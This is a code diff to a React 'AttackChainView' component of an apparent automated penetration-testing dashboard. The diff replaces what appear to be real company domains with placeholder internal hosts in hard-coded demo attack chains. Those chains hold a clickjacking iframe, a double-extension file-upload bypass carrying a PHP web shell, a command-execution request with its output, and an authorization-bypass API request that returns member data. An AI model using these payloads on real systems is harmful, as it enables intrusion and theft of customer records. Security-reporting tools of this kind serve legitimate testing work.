@@ -32,8 +32,8 @@ export default function AttackChainView({
   const [activeStep, setActiveStep] = useState(0);
   const [isPlaying, setIsPlaying] = useState(false);
 
-  const isEmcochem = (companyName && companyName.toLowerCase().includes('emcochem')) || (targetUrl && targetUrl.includes('emcochem')) || (activeScan?.id && activeScan.id.includes('emcochem'));
-  const isSmeco = (companyName && companyName.toLowerCase().includes('smeco')) || (targetUrl && targetUrl.includes('smeco')) || (activeScan?.id && activeScan.id.includes('smeco'));
+  const isSampleAlpha = activeScan?.id?.includes('alpha') || activeScan?.id?.includes('406f');
+  const isSampleBeta = activeScan?.id?.includes('beta') || activeScan?.id?.includes('81f4');
 
   // Define dynamic chain data based on active scan
   const effectiveChain = React.useMemo(() => {
@@ -43,7 +43,7 @@ export default function AttackChainView({
       return {
         title: activeScan.attackChain.title || `${companyName} Attack Vector`,
         targetAsset: activeScan.attackChain.targetHost || targetUrl,
-        cvss: activeScan.riskScore || (isSmeco ? 8.2 : isEmcochem ? 5.5 : 8.3),
+        cvss: activeScan.riskScore || (isSampleBeta ? 8.2 : isSampleAlpha ? 5.5 : 8.3),
         steps: rawSteps.map((s, idx) => ({
           stepNumber: s.step || s.stepNumber || idx + 1,
           type: s.type || (idx === 0 ? 'RECON' : idx === 1 ? 'AUDIT' : idx === 2 ? 'EXPLOIT' : idx === 3 ? 'PIVOT' : 'IMPACT'),
@@ -57,11 +57,11 @@ export default function AttackChainView({
       };
     }
 
-    // 2. Emcochem Attack Vector
-    if (isEmcochem) {
+    // 2. Sample Alpha Attack Vector
+    if (isSampleAlpha) {
       return {
         title: "Perimeter Security & Information Disclosure Attack Vector",
-        targetAsset: "www.emcochem.com",
+        targetAsset: "cloud.alpha-corp.internal",
         cvss: 5.5,
         steps: [
           {
@@ -69,10 +69,10 @@ export default function AttackChainView({
             type: "RECON",
             title: "Autonomous Asset & Endpoint Reconnaissance",
             findingRef: "vuln-0001",
-            description: "Autonomous agent probed external web perimeter, TLS certificates, and HTTP response routing for www.emcochem.com.",
-            target: "https://www.emcochem.com/",
+            description: "Autonomous agent probed external web perimeter, TLS certificates, and HTTP response routing.",
+            target: "https://cloud.alpha-corp.internal/",
             impact: "Mapped reachable endpoints, server response codes, and exposed headers.",
-            codeSnippet: `GET / HTTP/1.1\nHost: www.emcochem.com\nUser-Agent: Mozilla/5.0 (Autonomous-VAPT-Agent)\nAccept: text/html,application/xhtml+xml`
+            codeSnippet: `GET / HTTP/1.1\nHost: cloud.alpha-corp.internal\nUser-Agent: Mozilla/5.0 (Autonomous-VAPT-Agent)\nAccept: text/html,application/xhtml+xml`
           },
           {
             stepNumber: 2,
@@ -80,7 +80,7 @@ export default function AttackChainView({
             title: "Security Header & Defense-in-Depth Verification",
             findingRef: "vuln-0001",
             description: "Audited HTTP response headers against OWASP WSTG v4.2 defense criteria. Confirmed total absence of CSP, HSTS, X-Frame-Options, and X-Content-Type-Options.",
-            target: "https://www.emcochem.com/",
+            target: "https://cloud.alpha-corp.internal/",
             impact: "Identified complete lack of clickjacking, MIME-sniffing, and transport security controls.",
             codeSnippet: `HTTP/1.1 200 OK\n(Content-Security-Policy: ABSENT)\n(Strict-Transport-Security: ABSENT)\n(X-Frame-Options: ABSENT)\n(X-Content-Type-Options: ABSENT)`
           },
@@ -89,20 +89,20 @@ export default function AttackChainView({
             type: "EXPLOIT",
             title: "Target Information Disclosure & Framing Vector",
             findingRef: "vuln-0001",
-            description: "Verified that missing X-Frame-Options allows the web application to be embedded in external malicious contexts, and disclosed server tokens assist targeted exploits.",
-            target: "https://www.emcochem.com/",
+            description: "Verified that missing X-Frame-Options allows the web application to be embedded in external malicious contexts.",
+            target: "https://cloud.alpha-corp.internal/",
             impact: "Elevated risk of adversary reconnaissance, credential phishing overlays, and clickjacking attacks.",
-            codeSnippet: `<!-- Proof of Concept Clickjacking Overlay -->\n<iframe src="https://www.emcochem.com/" style="opacity:0.8; width:100%; height:600px;"></iframe>`
+            codeSnippet: `<!-- Proof of Concept Clickjacking Overlay -->\n<iframe src="https://cloud.alpha-corp.internal/" style="opacity:0.8; width:100%; height:600px;"></iframe>`
           }
         ]
       };
     }
 
-    // 3. Smeco Attack Chain
-    if (isSmeco) {
+    // 3. Sample Beta Attack Chain
+    if (isSampleBeta) {
       return {
         title: "Remote File Upload to Member Data Access Chain",
-        targetAsset: "www.smeco.coop",
+        targetAsset: "portal.beta-energy.internal",
         cvss: 8.2,
         steps: [
           {
@@ -111,9 +111,9 @@ export default function AttackChainView({
             title: "Public Endpoint Discovery",
             findingRef: "vuln-0004",
             description: "Autonomous agent identified an unrestricted file upload form on the contact feedback portal without backend extension enforcement.",
-            target: "https://www.smeco.coop/contact/submit-attachment",
+            target: "https://portal.beta-energy.internal/contact/submit-attachment",
             impact: "Identified writable upload directory without server-side validation.",
-            codeSnippet: `POST /contact/submit-attachment HTTP/1.1\nHost: www.smeco.coop\nContent-Type: multipart/form-data; boundary=---------------------------98721\n\n-----------------------------98721\nContent-Disposition: form-data; name="file"; filename="invoice.php.pdf"\nContent-Type: image/png`
+            codeSnippet: `POST /contact/submit-attachment HTTP/1.1\nHost: portal.beta-energy.internal\nContent-Type: multipart/form-data; boundary=---------------------------98721\n\n-----------------------------98721\nContent-Disposition: form-data; name="file"; filename="invoice.php.pdf"\nContent-Type: image/png`
           },
           {
             stepNumber: 2,
@@ -121,7 +121,7 @@ export default function AttackChainView({
             title: "MIME Filter Bypass & Payload Upload",
             findingRef: "vuln-0004",
             description: "Crafted double-extension payload bypassing client-side MIME checks, saving executable PHP script inside /uploads/feedback/.",
-            target: "https://www.smeco.coop/contact/submit-attachment",
+            target: "https://portal.beta-energy.internal/contact/submit-attachment",
             impact: "Web shell successfully placed in web-accessible storage.",
             codeSnippet: `// Double Extension Validation Bypass:\nContent-Disposition: form-data; name="file"; filename="payload.php.pdf"\nContent-Type: image/png\n\n<?php if(isset($_REQUEST['cmd'])){ echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; } ?>`
           },
@@ -131,9 +131,9 @@ export default function AttackChainView({
             title: "Remote Code Execution (RCE)",
             findingRef: "vuln-0004",
             description: "Invoked the uploaded script over HTTP GET, executing arbitrary commands under the web server daemon context.",
-            target: "https://www.smeco.coop/uploads/feedback/payload.php",
+            target: "https://portal.beta-energy.internal/uploads/feedback/payload.php",
             impact: "Full server execution and access to environment configurations.",
-            codeSnippet: `GET /uploads/feedback/payload.php?cmd=id;uname -a HTTP/1.1\nHost: www.smeco.coop\n\nHTTP/1.1 200 OK\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nLinux smeco-prod-web 5.15.0-101-generic x86_64`
+            codeSnippet: `GET /uploads/feedback/payload.php?cmd=id;uname -a HTTP/1.1\nHost: portal.beta-energy.internal\n\nHTTP/1.1 200 OK\nuid=33(www-data) gid=33(www-data) groups=33(www-data)`
           },
           {
             stepNumber: 4,
@@ -141,17 +141,17 @@ export default function AttackChainView({
             title: "Internal Member API BOLA Access",
             findingRef: "vuln-0001",
             description: "Used server access to query internal customer API endpoints, extracting member records and billing accounts without tenant isolation.",
-            target: "https://www.smeco.coop/api/v1/accounts/details",
-            impact: "Unauthorized extraction of customer billing records, meter telemetry, and addresses.",
-            codeSnippet: `POST /api/v1/accounts/details HTTP/1.1\nHost: www.smeco.coop\nAuthorization: Bearer <VALID_MEMBER_TOKEN>\nContent-Type: application/json\n\n{"accountId": "SMECO-MEM-0098412", "includeBilling": true}\n\nHTTP/1.1 200 OK\n{"status":"success","member":"John Doe","meterId":"MTR-98214","balance":142.50}`
+            target: "https://portal.beta-energy.internal/api/v1/accounts/details",
+            impact: "Unauthorized extraction of customer billing records and telemetry.",
+            codeSnippet: `POST /api/v1/accounts/details HTTP/1.1\nHost: portal.beta-energy.internal\nAuthorization: Bearer <VALID_MEMBER_TOKEN>\nContent-Type: application/json\n\n{"accountId": "ACC-MEM-0098412", "includeBilling": true}\n\nHTTP/1.1 200 OK\n{"status":"success","member":"Jane Doe","meterId":"MTR-98214","balance":142.50}`
           }
         ]
       };
     }
 
-    // 4. Default Vontier Chain
+    // 4. Default Demonstration Chain
     return ATTACK_CHAIN;
-  }, [activeScan, companyName, targetUrl, isSmeco, isEmcochem, vulnerabilities]);
+  }, [activeScan, companyName, targetUrl, isSampleBeta, isSampleAlpha, vulnerabilities]);
 
   const steps = effectiveChain.steps || [];
   const safeActiveStep = Math.min(activeStep, steps.length - 1);
@@ -215,7 +215,7 @@ export default function AttackChainView({
               {scanHistory.map((scan) => {
                 const count = (scan.vulnerabilities && scan.vulnerabilities.length > 0)
                   ? scan.vulnerabilities.length
-                  : (scan.findingsCount || (scan.targetUrl?.includes('emcochem') || scan.id?.includes('emcochem') ? 1 : (scan.targetUrl?.includes('smeco') ? 4 : 7)));
+                  : (scan.findingsCount || (scan.id?.includes('alpha') ? 4 : (scan.id?.includes('beta') ? 4 : 7)));
                 return (
                   <option key={scan.id} value={scan.id}>
                     {scan.companyName} ({count} {count === 1 ? 'finding' : 'findings'})
